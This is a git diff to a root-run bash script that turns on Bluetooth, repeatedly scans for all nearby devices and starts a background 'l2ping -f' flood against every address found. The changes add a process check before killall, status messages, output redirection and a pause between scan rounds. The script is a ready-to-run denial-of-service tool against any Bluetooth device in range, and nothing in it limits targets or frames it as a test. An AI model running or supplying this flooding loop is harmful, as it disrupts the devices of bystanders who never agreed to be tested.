@@ -7,7 +7,9 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 cleanup() {
-    killall l2ping
+    if [ -n "$(ps -A -o comm,pmem,rss | grep l2ping)" ]; then
+        killall l2ping
+    fi
     printf "\n"
     read -p "Do you want to turn off bluetooth (hci0)? [Y/n] " RESP
     if [ $RESP == 'Y' ]; then
@@ -23,11 +25,21 @@ trap cleanup EXIT
 echo "Turning bluetooth on (hci0)..."
 sudo hciconfig hci0 up
 echo "Done!"
+echo ""
 
 while [ 1 ]; do
-    DEVICES=$(hcitool scan | awk 'length NR>2{print $1}')
+    echo "Scanning..."
+    DEVICES=$(hcitool scan | awk 'length NR>2{print $1}' 2>&1)
+    echo "Done scanning..."
+    echo ""
+
     for bd_addr in $DEVICES; do
         echo "Pinging ${bd_addr}..."
-        sudo l2ping -f $bd_addr > /dev/null 2>/dev/null &
+        sudo l2ping -f $bd_addr 2>&1 > /dev/null &
     done
+
+    if [ -n "${DEVICES}" ]; then
+        echo ""
+        sleep 5
+    fi
 done
